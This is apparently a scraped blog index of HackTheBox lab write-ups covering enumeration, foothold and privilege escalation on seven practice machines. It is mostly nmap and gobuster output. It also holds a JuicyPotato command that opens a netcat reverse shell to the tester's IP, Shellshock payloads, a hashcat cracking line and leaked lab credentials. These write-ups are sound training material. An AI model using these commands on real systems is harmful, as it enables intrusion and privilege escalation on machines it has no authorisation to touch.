up) scanned in 23.","tags":["HTB"],"title":"[HTB] Machine: Teacher"},{"categories":null,"contents":"Active Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.100 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 09:34 BST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 5.75% done; ETC: 09:34 (0:00:16 remaining) Nmap scan report for 10.10.10.100 (10.10.10.100) Host is up (0.17s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-11 08:34:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-06-11T08:35:17 |_ start_date: 2023-06-11T08:16:24 | smb2-security-mode: | 210: |_ Message signing enabled and required |_clock-skew: -30s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 104.06 seconds SMB enumeration enum4linux 10.10.10.100 Check Replication share â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ smbmap -H 10.10.10.100 -R [+] IP: 10.10.10.100:445 Name: 10.10.10.100 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server share Replication READ ONLY .\\Replication\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 active.htb .\\Replication\\active.htb\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 DfsrPrivate dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Policies dr--r--r-- 0 Sat Jul 21 11:37:44 2018 scripts .\\Replication\\active.htb\\DfsrPrivate\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 ConflictAndDeleted dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Deleted dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Installing .\\Replication\\active.htb\\Policies\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9} dr--r--r-- 0 Sat Jul 21 11:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9} .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. fr--r--r-- 23 Sat Jul 21 11:38:11 2018 GPT.INI dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Group Policy dr--r--r-- 0 Sat Jul 21 11:37:44 2018 MACHINE dr--r--r-- 0 Sat Jul 21 11:37:44 2018 USER .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. fr--r--r-- 119 Sat Jul 21 11:38:11 2018 GPE.INI .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Microsoft dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Preferences fr--r--r-- 2788 Sat Jul 21 11:38:11 2018 Registry.pol .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Windows NT .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Groups .\\Replication\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. fr--r--r-- 22 Sat Jul 21 11:38:11 2018 GPT.INI dr--r--r-- 0 Sat Jul 21 11:37:44 2018 MACHINE dr--r--r-- 0 Sat Jul 21 11:37:44 2018 USER .\\Replication\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Microsoft .\\Replication\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Windows NT SYSVOL NO ACCESS Logon server share Users NO ACCESS Let\u0026rsquo;s open Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; ~ Foothold/User We got a password from smb enumeration Let\u0026rsquo;s decrypt using gpp-decrypt Root Since it\u0026rsquo;s a Domain Controller Let\u0026rsquo;s do basic enumeration for Active Directory Check SPN\u0026rsquo;s And we get Administrator\u0026rsquo;s hash Let\u0026rsquo;s crack it hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt Rooted ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/active/images/active.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/active/","summary":"Active Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.100 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 09:34 BST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 5.75% done; ETC: 09:34 (0:00:16 remaining) Nmap scan report for 10.10.10.100 (10.10.10.100) Host is up (0.17s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.","tags":["HTB"],"title":"[HTB] Machine: Active"},{"categories":null,"contents":"Bashed Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.68 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 18:47 BST Nmap scan report for 10.10.10.68 (10.10.10.68) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel\u0026#39;s Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.87 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.68/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -x php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.68/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/08 19:48:11 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.68/images/] /uploads (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.68/uploads/] /config.php (Status: 200) [Size: 0] /dev (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/dev/] /php (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/php/] /js (Status: 301) [Size: 307] [--\u0026gt; http://10.10.10.68/js/] /css (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/css/] /fonts (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.68/fonts/] /server-status (Status: 403) [Size: 299] /.php (Status: 403) [Size: 290] Webserver Foothold/User Let\u0026rsquo;s check dev directory We see phpbash.php Let\u0026rsquo;s open it And we get a webshell Let\u0026rsquo;s try to upgrade the shell Setup a listener and send a reverse shell payload Root Enumerate for privesc sudo -l We can sudo as scriptmanager Let\u0026rsquo;s launch bash as scriptmanager Enumerate as scriptmanager We see interesting directory named /scripts owned by scriptmanager Let\u0026rsquo;s check it Open the script and analyse You will see that it creates a test.txt Notice that the test.txt is owned by root It looks like there is an automated process or cronjob that launches test.py as a root use pspy64 So we can change the content of the test.py and get reverse shell ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bashed/images/bashed.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bashed/","summary":"Bashed Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.68 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 18:47 BST Nmap scan report for 10.10.10.68 (10.10.10.68) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel\u0026#39;s Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.","tags":["HTB"],"title":"[HTB] Machine: Bashed"},{"categories":null,"contents":"Bounty Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.93 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 16:26 BST Nmap scan report for 10.10.10.93 (10.10.10.93) Host is up (0.098s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.93 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.93 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,apsx [+] Timeout: 10s =============================================================== 2023/06/10 16:39:26 Starting gobuster in directory enumeration mode =============================================================== /transfer.aspx (Status: 200) [Size: 941] /UploadedFiles (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.93/UploadedFiles/] /uploadedFiles (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.93/uploadedFiles/] /uploadedfiles (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.93/uploadedfiles/] Progress: 661634 / 661683 (99.99%) =============================================================== 2023/06/10 17:15:00 Finished =============================================================== Web server Foothold/User We see transfer.aspx and uploadedFiles endpoints available Let\u0026rsquo;s upload a file Success But I couldn\u0026rsquo;t upload a file with aspx extension there is a blog and this one from the same author Test out the poc And we see that we have rce I was trying different variations of poc but had no success Turns out, I broke the box so I needed to reboot it Then I used the same poc from the first blog as in the picture above But added few modifications, using /usr/share/webshells/asp/cmdasp.asp Let\u0026rsquo;s upload and run it And we get our foothold Root Enumerate privileges whoami /priv We see SeImpersonatePrivilege Let\u0026rsquo;s run JuicyPotato So download binary and nc.exe Set up new listener .\\jp.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \u0026quot;/c c:\\users\\merlin\\downloads\\nc.exe 10.10.16.3 7777 -e cmd.exe\u0026quot; -t * And root the box ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/bounty/images/bounty.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/bounty/","summary":"Bounty Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.93 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 16:26 BST Nmap scan report for 10.10.10.93 (10.10.10.93) Host is up (0.098s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Bounty"},{"categories":null,"contents":"Jerry Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.95 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 12:02 BST Nmap scan report for 10.10.10.95 (10.10.10.95) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-open-proxy: Proxy might be redirecting requests |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds Web Server Foothold/User/Root Let\u0026rsquo;s try default creds for Tomcat's Manager Application tomcat:s3cret Success Now we can deploy our app Generate payload using msvenom with externsion war Upload it Let\u0026rsquo;s find the jsp page generated by msfvenom Open the path And we get our root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/jerry/images/jerry.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/jerry/","summary":"Jerry Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.95 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 12:02 BST Nmap scan report for 10.10.10.95 (10.10.10.95) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-open-proxy: Proxy might be redirecting requests |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Jerry"},{"categories":null,"contents":"Nibbles nmap â””â”€$ nmap -sC -sV 10.10.10.75 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 17:13 BST Nmap scan report for 10.10.10.75 (10.10.10.75) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.68 seconds We see the comment in the page source gobuster â””â”€$ gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -x php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.75/nibbleblog [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/08 17:38:18 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 321] [--\u0026gt; http://10.10.10.75/nibbleblog/admin/] /feed.php (Status: 200) [Size: 302] /install.php (Status: 200) [Size: 78] /content (Status: 301) [Size: 323] [--\u0026gt; http://10.10.10.75/nibbleblog/content/] /languages (Status: 301) [Size: 325] [--\u0026gt; http://10.10.10.75/nibbleblog/languages/] /sitemap.php (Status: 200) [Size: 402] /themes (Status: 301) [Size: 322] [--\u0026gt; http://10.10.10.75/nibbleblog/themes/] /admin.php (Status: 200) [Size: 1401] /index.php (Status: 200) [Size: 2987] /plugins (Status: 301) [Size: 323] [--\u0026gt; http://10.10.10.75/nibbleblog/plugins/] /update.php (Status: 200) [Size: 1622] /.php (Status: 403) [Size: 301] Let\u0026rsquo;s check admin.php We see the version of the Nibbleblog Foothold/User Let\u0026rsquo;s search for exploits We found the file upload exploit which can be launched only as an authenticated user Let\u0026rsquo;s enumerate other directories that were found by gobuster We found username No signs of password, so let\u0026rsquo;s try guessing, since there are no default passwords Luckily it was the name of the box Now we can launch file upload attack And get our shell Root Basic privesc enumeration sudo -l Let\u0026rsquo;s check the indicated path We can create a new file with the same name or append the code we want it to execute I created new file which deployed a reverse shell And we get our root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/nibbles/images/nibbles.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/nibbles/","summary":"Nibbles nmap â””â”€$ nmap -sC -sV 10.10.10.75 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 17:13 BST Nmap scan report for 10.10.10.75 (10.10.10.75) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.","tags":["HTB"],"title":"[HTB] Machine: Nibbles"},{"categories":null,"contents":"Sense Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.60 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 16:21 BST Nmap scan report for 10.10.10.60 (10.10.10.60) Host is up (0.11s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/http lighttpd 1.4.35 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_http-title: Login |_http-server-header: lighttpd/1.4.35 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.55 seconds d â””â”€$ gobuster dir -u https://10.10.10.60/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.10.60/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/06/09 16:46:37 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 6690] /help.php (Status: 200) [Size: 6689] /themes (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/themes/] /stats.php (Status: 200) [Size: 6690] /css (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/css/] /edit.php (Status: 200) [Size: 6689] /includes (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/includes/] /license.php (Status: 200) [Size: 6692] /system.php (Status: 200) [Size: 6691] /status.php (Status: 200) [Size: 6691] /javascript (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/javascript/] /changelog.txt (Status: 200) [Size: 271] /classes (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/classes/] /exec.php (Status: 200) [Size: 6689] /widgets (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/widgets/] /graph.php (Status: 200) [Size: 6690] /tree (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/tree/] /wizard.php (Status: 200) [Size: 6691] /shortcuts (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/shortcuts/] /pkg.php (Status: 200) [Size: 6688] /installer (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/installer/] /wizards (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/wizards/] /xmlrpc.php (Status: 200) [Size: 384] /reboot.php (Status: 200) [Size: 6691] /interfaces.php (Status: 200) [Size: 6695] /csrf (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/csrf/] /system-users.txt (Status: 200) [Size: 106] /filebrowser (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/filebrowser/] Login page We see system-users.txt and changelog.txt files Let\u0026rsquo;s check them Foothold/User/Root So based on the notes, we can try rohit:pfsense And we get an access We see the version of the pfsense Googling for the exploits and vulnerabilities resulted in this blog Let\u0026rsquo;s try manually exploit the vulnerability Let\u0026rsquo;s nagivate to vulnerable path Let\u0026rsquo;s test the RCE Success If we carefully read the blog we can see that there are bad chars that we can\u0026rsquo;t use for our payload / and - So we have to find a way to bypass the limitation We can check env and use one of the variables Like HOME which contains / Now we need a - Here we can use printf and use octal representation of -, which is \\55 I didn\u0026rsquo;t try hex or decimal representation, but I think hex should work too \\x2d Let\u0026rsquo;s test it So tried different reverse shell one liners, but had no success Thus, I saw a technique, where you supply a payload to nc and wait for connection Then from target host connect to attack host and pipe the result to interpreter which will execute the payload And we get our root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/sense/images/sense.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/sense/","summary":"Sense Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.60 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 16:21 BST Nmap scan report for 10.10.10.60 (10.10.10.60) Host is up (0.11s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/http lighttpd 1.4.35 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_http-title: Login |_http-server-header: lighttpd/1.","tags":["HTB"],"title":"[HTB] Machine: Sense"},{"categories":null,"contents":"Shocker Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.56 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 20:39 BST Nmap scan report for 10.10.10.56 (10.10.10.56) Host is up (0.15s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.10 seconds gobuster the option -f is important, since it will Append / to each request I wasn\u0026rsquo;t able to find anything without that option â””â”€$ gobuster dir -u http://10.10.10.56/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -f =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.56/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Add Slash: true [+] Timeout: 10s =============================================================== 2023/06/10 05:47:40 Starting gobuster in directory enumeration mode =============================================================== /cgi-bin/ (Status: 403) [Size: 294] /icons/ (Status: 403) [Size: 292] /server-status/ (Status: 403) [Size: 300] Let\u0026rsquo;s check the content of the cgi-bin â””â”€$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 50 -x sh,cgi,pl =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.56/cgi-bin/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: sh,cgi,pl [+] Timeout: 10s =============================================================== 2023/06/10 06:09:48 Starting gobuster in directory enumeration mode =============================================================== /.html.cgi (Status: 403) [Size: 303] /.html.pl (Status: 403) [Size: 302] /.html (Status: 403) [Size: 299] /.html.sh (Status: 403) [Size: 302] /user.sh (Status: 200) [Size: 118] /.htm (Status: 403) [Size: 298] /.htm.cgi (Status: 403) [Size: 302] /.htm.pl (Status: 403) [Size: 301] /.htm.sh (Status: 403) [Size: 301] /. (Status: 403) [Size: 294] /.htaccess (Status: 403) [Size: 303] ... We found user.sh Foothold/User The name of the suggest the Shellshock, CVE-2014-6271 https://en.wikipedia.org/wiki/Shellshock_(software_bug) env x='() { :;}; echo vulnerable' bash -c \u0026quot;echo this is a test\u0026quot; User-Agent header is usually the target We can also test other headers: Cookie, Referer We use echo; to receive response back from server, but RCE still exists without it You can try () { :;}; /bin/ping -c1 10.10.16.3 You will not receive http-response, but will receive ping Notice that we have to use full path of the binary for execution Let\u0026rsquo;s get a reverse shell Root Enumeration for privesc sudo -l GTFOBins Rooted ","date":"June 7, 